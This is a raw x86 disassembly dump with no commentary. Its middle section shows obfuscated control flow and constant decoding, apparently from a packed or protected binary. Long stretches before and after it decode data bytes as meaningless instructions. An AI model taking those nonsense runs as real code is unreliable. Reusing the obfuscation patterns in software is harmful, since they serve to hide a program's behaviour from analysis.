  411cb4:	mov    dl,0x5
  411cb6:	scas   al,BYTE PTR es:[edi]
  411cb7:	cwde   
  411cb8:	dec    eax
  411cb9:	daa    
  411cba:	xchg   DWORD PTR [esi],ebp
  411cbc:	push   ebp
  411cbd:	nop
  411cbe:	pop    es
  411cbf:	ret    0x3ca0
  411cc2:	jle    0x411c55
  411cc4:	or     al,0xa2
  411cc6:	std    
  411cc7:	sbb    al,0xa0
  411cc9:	int3   
  411cca:	(bad)  
  411ccb:	jnp    0x411cee
  411ccd:	jl     0x773331e1
  411cd3:	fwait
  411cd4:	push   0xffffffc1
  411cd6:	ds xchg ecx,eax
  411cd8:	jl     0x411cea
  411cda:	hlt    
  411cdb:	leave  
  411cdc:	fst    st(4)
  411cde:	js     0x411ca3
  411ce0:	xchg   ecx,eax
  411ce1:	mov    ds:0x56e5df61,al
  411ce6:	je     0x411cc6
  411ce8:	das    
  411ce9:	fwait
  411cea:	in     eax,0x31
  411cec:	cmp    esi,DWORD PTR [eax+0x21]
  411cef:	jp     0x411c96
  411cf1:	push   ecx
  411cf2:	or     al,0x35
  411cf4:	sti    
  411cf5:	cmp    esi,DWORD PTR [esp+ebp*1]
  411cf8:	sub    esi,edx
  411cfa:	loopne 0x411d78
  411cfc:	imul   eax,edi,0xf73064a8
  411d02:	cmp    esi,DWORD PTR [edx+ecx*2]
  411d05:	mov    esi,0x3b547f98
  411d0a:	adc    eax,0x1c905b7c
  411d0f:	inc    esp
  411d10:	sbb    DWORD PTR [ebx],ebp
  411d12:	imul   esp,DWORD PTR [esi-0x6a81c901],0xffffffa4
  411d19:	adc    al,0x75
  411d1b:	repnz add esp,DWORD PTR [eax+0x4]
  411d1f:	dec    edi
  411d20:	push   0x54031931
  411d25:	in     al,0xb
  411d27:	loopne 0x411d53
  411d29:	mov    esi,DWORD PTR [ecx]
  411d2b:	mov    esi,0xef37f34b
  411d30:	pop    ecx
  411d31:	scas   al,BYTE PTR es:[edi]
  411d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d33:	jg     0x411d9f
  411d35:	test   eax,0x81395bb9
  411d3a:	inc    eax
  411d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3c:	ret    
  411d3d:	pop    ss
  411d3e:	call   0xde17:0xfacf664d
  411d45:	adc    DWORD PTR [esi-0x4889fdf5],0xffffffde
  411d4c:	or     BYTE PTR [eax],ch
  411d4e:	out    dx,al
  411d4f:	rol    DWORD PTR [ecx-0x29],cl
  411d52:	pop    esp
  411d53:	mov    bh,0x2d
  411d55:	je     0x7fead7d7
  411d5b:	loope  0x411da8
  411d5d:	push   esp
  411d5e:	adc    dh,bh
  411d60:	sti    
  411d61:	cmp    DWORD PTR [esi+0x62],eax
  411d64:	mov    edi,0x56ffeb25
  411d69:	xchg   DWORD PTR [esp+edx*2],esi
  411d6c:	jecxz  0x411d5d
  411d6e:	adc    BYTE PTR [ebx+0x68],0x39
  411d72:	in     eax,0x6a
  411d74:	sar    BYTE PTR [edx],1
  411d76:	xchg   DWORD PTR [edx-0x38fcb9b4],edx
  411d7c:	pop    esp
  411d7d:	xchg   esi,eax
  411d7e:	arpl   WORD PTR [ebp+0x8f9fcf3],sp
  411d84:	inc    edi
  411d85:	inc    ecx
  411d86:	aaa    
  411d87:	xchg   esi,eax
  411d88:	lock lods eax,DWORD PTR ds:[esi]
  411d8a:	pop    ebp
  411d8b:	outs   dx,BYTE PTR ds:[esi]
  411d8c:	lods   al,BYTE PTR ds:[esi]
  411d8d:	sbb    DWORD PTR [ecx],ecx
  411d8f:	call   0xb8270385
  411d94:	mov    ch,BYTE PTR [ecx-0x66385718]
  411d9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d9b:	jbe    0x411d7b
  411d9d:	add    al,0xc5
  411d9f:	sti    
  411da0:	xor    BYTE PTR [eax+0x420bf0e2],bh
  411da6:	push   es
  411da7:	(bad)  [ecx+0x70a97c24]
  411dad:	jno    0x411db0
  411daf:	xchg   edx,eax
  411db0:	or     BYTE PTR [edi-0x5d],0x67
  411db4:	nop
  411db5:	jmp    0x7185:0x41b9745
  411dbc:	mov    cl,0xd4
  411dbe:	les    edx,FWORD PTR ds:0x8463694
  411dc4:	cs inc esi
  411dc6:	test   BYTE PTR [ebp-0x328140f9],bh
  411dcc:	test   DWORD PTR [eax-0x80],esi
  411dcf:	adc    eax,0x904d7f0
  411dd4:	push   ss
  411dd5:	fist   WORD PTR [ebp+0x3d69adaa]
  411ddb:	in     al,0xd6
  411ddd:	pop    esi
  411dde:	popa   
  411ddf:	cli    
  411de0:	sub    eax,edx
  411de2:	stos   BYTE PTR es:[edi],al
  411de3:	sbb    esp,DWORD PTR [edx]
  411de5:	(bad)
  411de8:	int    0xd5
  411dea:	cmp    esp,DWORD PTR [esi-0x4df631df]
  411df0:	shl    DWORD PTR [eax+edi*1],0xb0
  411df4:	retf   
  411df5:	xor    bl,BYTE PTR [eax+0xd]
  411df8:	outs   dx,BYTE PTR ds:[esi]
  411df9:	dec    ecx
  411dfa:	xchg   ebx,eax
  411dfb:	sub    edx,DWORD PTR [esi]
  411dfd:	xor    edx,DWORD PTR [edx-0x49]
  411e00:	mov    dh,0x0
  411e02:	lahf   
  411e03:	sub    al,0xb6
  411e05:	imul   eax,DWORD PTR ds:0xd895e500,0x59
  411e0c:	xchg   edi,eax
  411e0d:	mov    edi,0x80fa7ba0
  411e12:	cwde   
  411e13:	fcomp  QWORD PTR [esi+0x32]
  411e16:	in     eax,dx
  411e17:	ds cs mov dl,0x79
  411e1b:	fmul   QWORD PTR [ebp+0x61]
  411e1e:	ds ret 
  411e20:	aad    0x5e
  411e22:	mov    esp,0x1e14354b
  411e27:	test   eax,0xbf80dedc
  411e2c:	ja     0x411e21
  411e2e:	inc    esi
  411e2f:	and    ebx,ebx
  411e31:	in     eax,0x82
  411e33:	pop    esp
  411e34:	rcl    BYTE PTR [ecx+0x2be43b56],cl
  411e3a:	sbb    eax,0xd628b692
  411e3f:	das    
  411e40:	addr16 cmp bl,dh
  411e43:	dec    edi
  411e44:	test   ebx,edx
  411e46:	adc    DWORD PTR [ecx],esp
  411e48:	invd   
  411e4a:	cwde   
  411e4b:	push   ds
  411e4c:	mov    ds:0xf683ae,eax
  411e51:	cmp    edx,ebx
  411e53:	jne    0x411e75
  411e59:	mov    DWORD PTR ds:0x42900c,0x30b0
  411e63:	cmp    esi,edi
  411e65:	mov    DWORD PTR ds:0x42d000,0x643
  411e6f:	je     0x411edc
  411e75:	sub    edx,0x6beb
  411e7b:	mov    edx,DWORD PTR ds:0x423f7f
  411e81:	mov    edx,DWORD PTR [edx+0x1c0]
  411e87:	mov    edx,DWORD PTR [edx]
  411e89:	sub    DWORD PTR ds:0x42c018,0x42901c
  411e93:	xor    esi,esi
  411e95:	add    edx,ecx
  411e97:	adc    esi,0xffffffff
  411e9a:	xor    edx,eax
  411e9c:	and    DWORD PTR ds:0x42d010,0x4e39
  411ea6:	xor    esi,0x0
  411ea9:	mov    DWORD PTR ds:0x42a018,0x6a83
  411eb3:	cmp    edx,0x70941fd1
  411eb9:	mov    DWORD PTR ds:0x42d014,0x6414
  411ec3:	jne    0x411f46
  411ec9:	mov    DWORD PTR ds:0x42b000,0x2399
  411ed3:	cmp    esi,0xffffffff
  411ed6:	jne    0x411f46
  411edc:	mov    edx,DWORD PTR ds:0x424003
  411ee2:	mov    esi,DWORD PTR ds:0x423ffb
  411ee8:	xor    edx,esi
  411eea:	mov    DWORD PTR ds:0x423ffb,edx
  411ef0:	mov    edx,DWORD PTR [ebp+0xc]
  411ef3:	mov    edx,DWORD PTR [edx]
  411ef5:	mov    edx,DWORD PTR [edx]
  411ef7:	mov    esi,DWORD PTR ds:0x423ffb
  411efd:	add    DWORD PTR [edx],esi
  411eff:	mov    esi,DWORD PTR [ebp+0x8]
  411f02:	mov    edx,DWORD PTR ds:0x423ffb
  411f08:	xor    esi,0x7510893
  411f0e:	add    esi,0x3272db
  411f14:	xor    ebx,ebx
  411f16:	add    esi,ecx
  411f18:	adc    ebx,0xffffffff
  411f1b:	xor    edi,edi
  411f1d:	xor    esi,eax
  411f1f:	xor    ebx,0x0
  411f22:	add    edx,ecx
  411f24:	adc    edi,0xffffffff
  411f27:	xor    edx,eax
  411f29:	xor    edi,0x0
  411f2c:	cmp    edx,esi
  411f2e:	jne    0x411f46
  411f34:	cmp    edi,ebx
  411f36:	jne    0x411f46
  411f3c:	mov    eax,ds:0x423ffb
  411f41:	mov    ds:0x424003,eax
  411f46:	pop    edi
  411f47:	pop    esi
  411f48:	pop    ebx
  411f49:	pop    ebp
  411f4a:	ret    0x8
  411f4d:	push   ebp
  411f4e:	mov    ebp,esp
  411f50:	sub    esp,0x90
  411f56:	add    DWORD PTR ds:0x42a01c,0x734d
  411f60:	push   esi
  411f61:	xor    ecx,0xb67
  411f67:	push   edi
  411f68:	xor    eax,DWORD PTR ds:0x42a018
  411f6e:	mov    eax,ds:0x423f7f
  411f73:	add    esi,0x4c8c
  411f79:	mov    DWORD PTR [ebp-0x2c],eax
  411f7c:	xor    ecx,0x3033
  411f82:	mov    eax,ds:0x42408b
  411f87:	and    DWORD PTR ds:0x42a010,0x0
  411f91:	mov    esi,DWORD PTR ds:0x42a010
  411f97:	inc    esi
  411f98:	mov    DWORD PTR ds:0x42a010,esi
  411f9e:	cmp    DWORD PTR ds:0x42a010,0xd
  411fa5:	jne    0x411fbe
  411fab:	push   0x1106
  411fb0:	push   DWORD PTR [ebp-0xc]
  411fb3:	push   0x571c
  411fb8:	call   DWORD PTR ds:0x425044
  411fbe:	cmp    DWORD PTR ds:0x42a010,0xc
  411fc5:	jne    0x411fda
  411fcb:	xor    esi,esi
  411fcd:	add    esi,DWORD PTR ds:0x42a010
  411fd3:	inc    esi
  411fd4:	mov    DWORD PTR ds:0x42a010,esi
  411fda:	cmp    DWORD PTR ds:0x42a010,0x14
  411fe1:	jb     0x411f91
  411fe7:	mov    DWORD PTR [ebp-0x3c],eax
  411fea:	and    DWORD PTR ds:0x42b004,edx
  411ff0:	and    DWORD PTR [ebp-0x34],0x0
  411ff4:	xor    ecx,DWORD PTR ds:0x42d010
  411ffa:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  412001:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  412008:	and    edi,DWORD PTR ds:0x42b018
  41200e:	mov    eax,DWORD PTR [ebp-0x1c]
  412011:	mov    ecx,DWORD PTR [ebp-0x1c]
  412014:	xor    edi,DWORD PTR ds:0x42b004
  41201a:	xor    eax,ecx
  41201c:	add    DWORD PTR ds:0x429018,ecx
  412022:	mov    DWORD PTR [ebp-0x1c],eax
  412025:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  41202c:	sub    ecx,esi
  41202e:	mov    eax,DWORD PTR [ebp-0x28]
  412031:	mov    DWORD PTR ds:0x42a010,0x1d
  41203b:	cmp    DWORD PTR ds:0x42a010,0x0
  412042:	je     0x4120a2
  412048:	cmp    DWORD PTR ds:0x42a010,0x4
  41204f:	jne    0x412069
  412055:	push   DWORD PTR [ebp-0x1c]
  412058:	push   0x61a2
  41205d:	push   DWORD PTR [ebp-0x1c]
  412060:	push   DWORD PTR [ebp-0x18]
  412063:	call   DWORD PTR ds:0x425048
  412069:	cmp    DWORD PTR ds:0x42a010,0x5
  412070:	jne    0x412083
  412076:	mov    ecx,DWORD PTR ds:0x42a010
  41207c:	dec    ecx
  41207d:	mov    DWORD PTR ds:0x42a010,ecx
  412083:	mov    ecx,DWORD PTR ds:0x42a010
  412089:	dec    ecx
  41208a:	mov    DWORD PTR ds:0x42a010,ecx
  412090:	jmp    0x41203b
  412095:	movzx  esi,BYTE PTR ds:0x42b010
  41209c:	sub    DWORD PTR ds:0x42c008,esi
  4120a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4120a5:	sub    edi,esi
  4120a7:	xor    eax,ecx
  4120a9:	mov    DWORD PTR [ebp-0x28],eax
  4120ac:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4120b3:	and    DWORD PTR ds:0x42b000,0x0
  4120bd:	mov    eax,ds:0x42b000
  4120c2:	inc    eax
  4120c3:	mov    ds:0x42b000,eax
  4120c8:	cmp    DWORD PTR ds:0x42b000,0x1d
  4120cf:	jne    0x4120de
  4120d5:	push   DWORD PTR [ebp-0x10]
  4120d8:	call   DWORD PTR ds:0x42504c
  4120de:	cmp    DWORD PTR ds:0x42b000,0x16
  4120e5:	jb     0x4120bd
  4120eb:	mov    DWORD PTR ds:0x429018,0x1a
  4120f5:	cmp    DWORD PTR ds:0x429018,0x0
  4120fc:	je     0x412149
  412102:	cmp    DWORD PTR ds:0x429018,0x9
  412109:	jne    0x41211d
  41210f:	push   DWORD PTR [ebp-0x10]
  412112:	push   0x42442f
  412117:	call   DWORD PTR ds:0x425010
  41211d:	cmp    DWORD PTR ds:0x429018,0xa
  412124:	jne    0x412137
  41212a:	mov    ecx,DWORD PTR ds:0x429018
  412130:	dec    ecx
  412131:	mov    DWORD PTR ds:0x429018,ecx
  412137:	mov    ecx,DWORD PTR ds:0x429018
  41213d:	dec    ecx
  41213e:	mov    DWORD PTR ds:0x429018,ecx
  412144:	jmp    0x4120f5
  412149:	mov    eax,DWORD PTR [ebp-0x18]
  41214c:	adc    ecx,esi
  41214e:	mov    ecx,DWORD PTR [ebp-0x18]
  412151:	xor    eax,ecx
  412153:	xor    esi,esi
  412155:	xor    esi,DWORD PTR ds:0x429028
  41215b:	sbb    DWORD PTR ds:0x429014,esi
  412161:	mov    DWORD PTR [ebp-0x18],eax
  412164:	mov    ecx,DWORD PTR ds:0x423d8b
  41216a:	mov    eax,ds:0x4242ee
  41216f:	sub    ecx,eax
  412171:	imul   ecx,DWORD PTR [ecx+eax*1]
  412175:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  41217c:	mov    DWORD PTR ds:0x42a018,0x18
  412186:	cmp    DWORD PTR ds:0x42a018,0x0
  41218d:	je     0x4121c0
  412193:	cmp    DWORD PTR ds:0x42a018,0x1b
  41219a:	jne    0x4121ac
  4121a0:	push   DWORD PTR [ebp-0x1c]
  4121a3:	push   DWORD PTR [ebp-0x18]
  4121a6:	call   DWORD PTR ds:0x425018
  4121ac:	xor    esi,esi
  4121ae:	or     esi,DWORD PTR ds:0x42a018
  4121b4:	dec    esi
  4121b5:	mov    DWORD PTR ds:0x42a018,esi
  4121bb:	jmp    0x412186
  4121c0:	mov    eax,DWORD PTR [ebp-0x24]
  4121c3:	or     DWORD PTR ds:0x429014,0x2eb5
  4121cd:	mov    ecx,DWORD PTR [ebp-0x24]
  4121d0:	mov    DWORD PTR ds:0x429000,0x1b
  4121da:	cmp    DWORD PTR ds:0x429000,0x0
  4121e1:	je     0x412218
  4121e7:	cmp    DWORD PTR ds:0x429000,0x2a
  4121ee:	jne    0x412206
  4121f4:	push   0x42901c
  4121f9:	push   0x0
  4121fb:	push   0x42431d
  412200:	call   DWORD PTR ds:0x42501c
  412206:	mov    esi,DWORD PTR ds:0x429000
  41220c:	dec    esi
  41220d:	mov    DWORD PTR ds:0x429000,esi
  412213:	jmp    0x4121da
  412218:	xor    eax,ecx
  41221a:	mov    DWORD PTR [ebp-0x24],eax
  41221d:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  412224:	sbb    eax,DWORD PTR ds:0x429004
  41222a:	mov    eax,DWORD PTR [ebp-0x14]
  41222d:	sub    DWORD PTR ds:0x429018,ecx
  412233:	mov    ecx,DWORD PTR [ebp-0x14]
  412236:	and    DWORD PTR ds:0x42d014,0x19f0
  412240:	xor    eax,ecx
  412242:	mov    DWORD PTR [ebp-0x14],eax
  412245:	mov    eax,DWORD PTR [ebp-0x20]
  412248:	mov    ecx,DWORD PTR [ebp-0x14]
  41224b:	dec    esi
  41224c:	mov    esi,0x7510893
  412251:	and    DWORD PTR ds:0x42a01c,0x5143
  41225b:	xor    eax,esi
  41225d:	and    DWORD PTR ds:0x42a004,0x0
  412267:	jmp    0x41227b
  41226c:	xor    edi,edi
  41226e:	add    edi,DWORD PTR ds:0x42a004
  412274:	inc    edi
  412275:	mov    DWORD PTR ds:0x42a004,edi
  41227b:	cmp    DWORD PTR ds:0x42a004,0x15
  412282:	jae    0x4122c2
  412288:	cmp    DWORD PTR ds:0x42a004,0x5
  41228f:	jne    0x4122a3
  412295:	push   0x42c018
  41229a:	push   DWORD PTR [ebp-0x24]
  41229d:	call   DWORD PTR ds:0x425020
  4122a3:	cmp    DWORD PTR ds:0x42a004,0x4
  4122aa:	jne    0x4122bd
  4122b0:	mov    edi,DWORD PTR ds:0x42a004
  4122b6:	inc    edi
  4122b7:	mov    DWORD PTR ds:0x42a004,edi
  4122bd:	jmp    0x41226c
  4122c2:	mov    edi,0x3272db
  4122c7:	add    eax,edi
  4122c9:	xor    eax,ecx
  4122cb:	mov    DWORD PTR [ebp-0x14],eax
  4122ce:	mov    eax,DWORD PTR [ebp-0x10]
  4122d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4122d4:	sub    eax,ecx
  4122d6:	mov    DWORD PTR [ebp-0x10],eax
  4122d9:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4122e0:	mov    al,BYTE PTR [ebp-0x1]
  4122e3:	movzx  ecx,BYTE PTR [ebp-0x1]
  4122e7:	movzx  eax,al
  4122ea:	sub    ecx,eax
  4122ec:	mov    BYTE PTR [ebp-0x1],cl
  4122ef:	movzx  eax,BYTE PTR [ebp-0x1]
  4122f3:	xor    eax,0xffffff99
  4122f6:	mov    BYTE PTR [ebp-0x1],al
  4122f9:	mov    eax,DWORD PTR [ebp-0x20]
  4122fc:	xor    eax,esi
  4122fe:	add    eax,edi
  412300:	mov    DWORD PTR [ebp-0x14],eax
  412303:	lea    eax,[ebp-0x40]
  412306:	mov    DWORD PTR [ebp-0x38],eax
  412309:	lea    eax,[ebp-0x38]
  41230c:	mov    DWORD PTR [ebp-0x44],eax
  41230f:	lea    eax,[ebp-0x44]
  412312:	mov    DWORD PTR [ebp-0x8],eax
  412315:	lea    eax,[ebp-0x8]
  412318:	mov    DWORD PTR [ebp-0x48],eax
  41231b:	mov    eax,DWORD PTR [ebp-0x18]
  41231e:	jmp    0x41466d
  412323:	test   cl,dl
  412325:	icebp  
  412326:	arpl   WORD PTR gs:[ebp+0x64],sp
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	push   0xf9f94cc8
  412330:	fild   QWORD PTR [eax+ebp*1+0x62626bde]
  412337:	push   eax
  412338:	pop    edi
  412339:	bound  esp,QWORD PTR [edx+0x2d]
  41233c:	jae    0x4122c1
  41233e:	mov    ah,0xa7
  412340:	push   esp
  412341:	xchg   esi,eax
  412342:	in     eax,dx
  412343:	mov    ecx,0x3f8eec42
  412348:	add    dh,al
  41234a:	bound  edi,QWORD PTR [edi-0x34fe5e82]
  412350:	(bad)  
  412352:	dec    eax
  412353:	cli    
  412354:	cmp    bh,BYTE PTR [ebx+0x90ab329]
  41235a:	sub    cl,BYTE PTR ds:0xead4637
  412360:	(bad)  [ecx+0x37]
  412363:	test   esi,edi
  412365:	xor    DWORD PTR [ebp-0x68b45fd8],ebx
  41236b:	fnstsw WORD PTR [ebp+edx*8-0x2]
  41236f:	sbb    BYTE PTR ds:0x8c554d65,0x40
  412376:	mov    ebx,eax
  412378:	lahf   
  412379:	or     ah,BYTE PTR [eax]
  41237b:	cli    
  41237c:	mov    ebp,0x628bf4ea
  412381:	xchg   esi,eax
  412382:	sbb    dh,BYTE PTR [ebx+esi*8+0x4a]
  412386:	dec    ebp
  412387:	mov    ds:0x54162491,eax
  41238c:	dec    ebx
  41238d:	imul   ebp,DWORD PTR [edi+0x67],0x3fb3641b
  412394:	clc    
  412395:	add    BYTE PTR [edx+eiz*1],0x31
  412399:	pop    es
  41239a:	icebp  
  41239b:	xor    dl,BYTE PTR [esi+0x60c42fa]
  4123a1:	cdq    
  4123a2:	in     eax,0x1b
  4123a4:	or     al,ah
  4123a6:	repnz pop ebp
  4123a8:	in     al,0xef
  4123aa:	mov    ecx,0x880b3700
  4123af:	sub    BYTE PTR [eax],al
  4123b1:	retf   
  4123b2:	ja     0x4123b3
  4123b4:	inc    BYTE PTR [ebp-0x1efccdce]
  4123ba:	aaa    
  4123bb:	xchg   esp,eax
  4123bc:	fdiv   DWORD PTR [edi-0x7196bcf4]
  4123c2:	pop    edi
  4123c3:	add    eax,0x26db442d
  4123c8:	mov    esi,es
  4123ca:	jge    0x412383
  4123cc:	mov    edi,0x1581bfd
  4123d1:	jle    0x412420
  4123d3:	fld    QWORD PTR [ebx+edx*8+0x21b0a059]
  4123da:	pop    ss
  4123db:	cmp    DWORD PTR [edx+0xb],edx
  4123de:	cs pushf 
  4123e0:	push   ebx
  4123e1:	jne    0x412428
  4123e3:	in     al,0x49
  4123e5:	std    
  4123e6:	pop    es
  4123e7:	jo     0x4123ab
  4123e9:	ins    DWORD PTR es:[edi],dx
  4123ea:	jnp    0x4123da
  4123ec:	mov    ebx,0x22da4d21
  4123f1:	ins    DWORD PTR es:[edi],dx
  4123f2:	sbb    dh,dh
  4123f4:	icebp  
  4123f5:	in     eax,0xc5
  4123f7:	push   eax
  4123f8:	push   ebx
  4123f9:	pusha  
  4123fa:	jl     0x412412
  4123fc:	data16 fild QWORD PTR [edi+0x42]
  412400:	mov    BYTE PTR es:[ebx+0x2c],ch
  412404:	or     BYTE PTR [ecx-0x4c],bh
  412407:	fsin   
  412409:	adc    ebx,DWORD PTR [edx]
  41240b:	push   esp
  41240c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41240d:	and    DWORD PTR [edx-0x7f],esp
  412410:	imul   ebx,edi,0x374e4563
  412416:	xor    ah,BYTE PTR [esi]
  412418:	cli    
  412419:	ror    DWORD PTR [edi-0x66],0x96
  41241d:	and    esi,DWORD PTR [edx+0x1a254c74]
  412423:	xchg   edx,eax
  412424:	into   
  412425:	add    ch,ch
  412427:	(bad)  
  412428:	adc    BYTE PTR [edx+0x21],cl
  41242b:	stc    
  41242c:	test   esp,esi
  41242e:	ja     0x412486
  412430:	inc    esi
  412431:	lock pop eax
  412433:	sbb    ebp,DWORD PTR [edi-0x7bbfd77]
  412439:	dec    edi
  41243a:	dec    eax
  41243b:	add    bl,bh
  41243d:	mov    ebx,0x9a628581
  412442:	jmp    0xe00dcaba
  412447:	jmp    0x2b653fc9
  41244c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41244d:	or     eax,0xb1ef7953
  412452:	mov    BYTE PTR [edx],dl
  412454:	jp     0x412414
  412456:	dec    edx
  412457:	sbb    al,0xbf
  412459:	lods   al,BYTE PTR ds:[esi]
  41245a:	mov    edi,0x6ddb7a90
  41245f:	adc    bh,BYTE PTR [ebx]
  412461:	push   ss
  412462:	and    DWORD PTR [edx],edx
  412464:	mov    edx,0x8ee6f406
  412469:	mov    al,0xc8
  41246b:	add    DWORD PTR [edx+0x14ecc33d],eax
  412471:	sete   BYTE PTR [edi]
  412474:	inc    esp
  412475:	lock dec eax
  412477:	inc    ebp
  412478:	inc    edx
  412479:	call   0xb5ec:0x812da48c
  412480:	cmp    BYTE PTR [eax+0x68e22a67],0x26
  412487:	or     BYTE PTR [edx*8-0x44ae3c17],dl
  41248e:	add    cl,dl
  412490:	inc    edx
  412491:	lock add eax,0xb33114b7
  412497:	fidiv  WORD PTR [edx+0xd53a02]
  41249d:	adc    esp,DWORD PTR [ebx+0x33b068de]
  4124a3:	sbb    al,0x87
  4124a5:	scas   eax,DWORD PTR es:[edi]
  4124a6:	and    DWORD PTR [ecx],edx
  4124a8:	nop
  4124a9:	pop    ebp
  4124aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124ab:	jnp    0x4124b7
  4124ad:	inc    edi
  4124ae:	fldcw  WORD PTR [eax]
  4124b0:	fld    TBYTE PTR [ecx+0x18]
  4124b3:	inc    edi
  4124b4:	std    
  4124b5:	jmp    0x412499
  4124b7:	ret    
  4124b8:	dec    edi
  4124b9:	adc    BYTE PTR [edx+0x78],dh
  4124bc:	mov    al,0x82
  4124be:	iret   
  4124bf:	dec    esi
  4124c0:	or     eax,0x14e03272
  4124c5:	push   0x1c332570
  4124ca:	frstor [ecx+0x47ab8000]
  4124d0:	or     DWORD PTR [ebx+0x43],eax
  4124d3:	aas    
  4124d4:	mov    esp,ss
  4124d6:	sbb    al,0x2b
  4124d8:	inc    ecx
  4124d9:	jmp    0xdcbc71ba
  4124de:	mov    BYTE PTR [edi+0x3c],dh
  4124e1:	into   
  4124e2:	push   0xfffffffa
  4124e4:	ins    BYTE PTR es:[edi],dx
  4124e5:	lods   al,BYTE PTR ds:[esi]
  4124e6:	aam    0x25
  4124e8:	ja     0x4124d7
  4124ea:	retf   
  4124eb:	sbb    ax,0x8611
  4124ef:	xor    DWORD PTR [esi+0x2399f44b],ebp
  4124f5:	xchg   BYTE PTR [edi+0x152a53ce],bh
  4124fb:	sahf   
  4124fc:	imul   eax,esi,0xa24452b6
  412502:	dec    edi
  412503:	or     cl,BYTE PTR [eax]
  412505:	gs push eax
  412507:	adc    DWORD PTR [esi],0x1e
  41250a:	push   ss
  41250b:	mov    BYTE PTR [edx],cl
  41250d:	jl     0x4124fe
  41250f:	mov    ds:0x848a7c82,al
  412514:	in     al,dx
  412515:	retf   
  412516:	xchg   ch,dl
  412518:	mov    al,ds:0x4228bdf6
  41251e:	mov    al,ds:0xcaecbac4
  412523:	dec    esp
  412524:	js     0x412525
  412526:	fist   WORD PTR [ebx-0x6e447443]
  41252c:	push   ebp
  41252d:	clc    
  41252e:	rol    DWORD PTR [ebx],1
  412530:	hlt    
  412531:	sub    ecx,DWORD PTR [esi]
  412533:	ja     0x4124de
  412535:	arpl   WORD PTR [esi+0x59f1effc],si
  41253b:	fcomp  QWORD PTR [ebx-0x7d]
  41253e:	imul   esi,DWORD PTR [ebp-0x4d],0xffffffb9
  412542:	in     al,dx
  412543:	pop    es
  412544:	cli    
  412545:	jnp    0x4125ab
  412547:	push   ss
  412548:	dec    edi
  412549:	div    BYTE PTR ds:0xb7b346aa
  41254f:	pushf  
  412550:	(bad)  
  412551:	loop   0x41258e
  412553:	nop
  412554:	js     0x4125c3
  412556:	dec    ecx
  412557:	cmp    eax,0xfdaf6fe7
  41255c:	pop    ds
  41255d:	data16 add BYTE PTR [ebx+0x46],ah
  412561:	jne    0x412524
  412563:	cli    
  412564:	adc    al,0xf5
  412566:	mov    dl,0xf6
  412568:	enter  0x785a,0x6d
  41256c:	les    esp,FWORD PTR [eax-0x27]
  41256f:	(bad)  
  412570:	mov    ds:0x6031719a,al
  412575:	xor    DWORD PTR [ebp+0x792bad10],ecx
  41257b:	ret    
  41257c:	hlt    
  41257d:	adc    DWORD PTR [bp+di],edx
  412580:	iret   
  412581:	les    eax,FWORD PTR [eax+0x38]
  412584:	add    DWORD PTR [ebx+esi*1],ebx
  412587:	in     eax,dx
  412588:	(bad)  
  412589:	out    0xe,eax
  41258b:	mov    ebx,0xe2b50d28
  412590:	pop    esp
  412591:	add    al,BYTE PTR [ecx-0x4ddb74ab]
  412597:	mov    eax,0xcbf17b9b
  41259c:	sub    eax,0xc16c345a
  4125a1:	jnp    0x412612
  4125a3:	cli    
  4125a4:	jnp    0x412554
  4125a6:	fist   WORD PTR [ecx-0x61]
  4125a9:	not    BYTE PTR ss:[ebx+eiz*2]
  4125ad:	ror    DWORD PTR [ebx+edx*8+0x26027ea0],cl
  4125b4:	adc    eax,0x7fb4f65f
  4125b9:	sar    DWORD PTR [ebp+0x513c2a89],0x31
  4125c0:	jne    0x412596
  4125c2:	mov    edi,0x111a829b
  4125c7:	call   0x7d23bddb
  4125cc:	out    dx,al
  4125cd:	mov    al,0x31
  4125cf:	cmp    eax,0x9808eecc
  4125d4:	faddp  st(0),st
  4125d6:	in     al,dx
  4125d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125d8:	push   ss
  4125d9:	call   0x61d2a1d6
  4125de:	jne    0x412639
  4125e0:	pusha  
  4125e1:	fnstcw WORD PTR [ecx+eax*1+0xe]
  4125e5:	adc    al,0x1d
  4125e7:	push   eax
  4125e8:	ret    0x10f3
  4125eb:	retf   
  4125ec:	cmp    BYTE PTR [edx],cl
  4125ee:	jmp    0xca06:0x6549ed2b
  4125f5:	test   DWORD PTR [esi+0x56],ebx
  4125f8:	lock cmp bl,BYTE PTR [edi+0x2d]
  4125fc:	bound  ebx,QWORD PTR [edx-0x9]
  4125ff:	sbb    BYTE PTR [esi+0x1d],0x58
  412603:	daa    
  412604:	js     0x412679
  412606:	iret   
  412607:	ret    
  412608:	in     eax,0x6a
  41260a:	inc    edi
  41260b:	xchg   edx,eax
  41260c:	push   eax
  41260d:	mov    BYTE PTR [edi+0x221164d2],bl
  412613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412614:	dec    ebp
  412615:	push   cs
  412616:	pop    eax
  412617:	inc    esp
  412618:	cmp    ah,ah
  41261a:	out    0x7e,al
  41261c:	or     BYTE PTR [ebp+0x3214a6be],bl
  412622:	or     DWORD PTR [esi+0x6d],ebp
  412625:	aaa    
  412626:	push   cs
  412627:	fsubr  DWORD PTR ds:0x65541c93
  41262d:	ins    BYTE PTR es:[edi],dx
  41262e:	stos   DWORD PTR es:[edi],eax
  41262f:	(bad)  
  412630:	adc    eax,0x88626682
  412635:	pop    ebp
  412636:	xchg   DWORD PTR ss:[edi-0x63],ecx
  41263a:	and    BYTE PTR [ecx-0x35df2411],ch
  412640:	jmp    0x8ecd7119
  412645:	cdq    
  412646:	call   0xb7327143
  41264b:	fbstp  TBYTE PTR [ebx-0x67]
  41264e:	jmp    0x4126ce
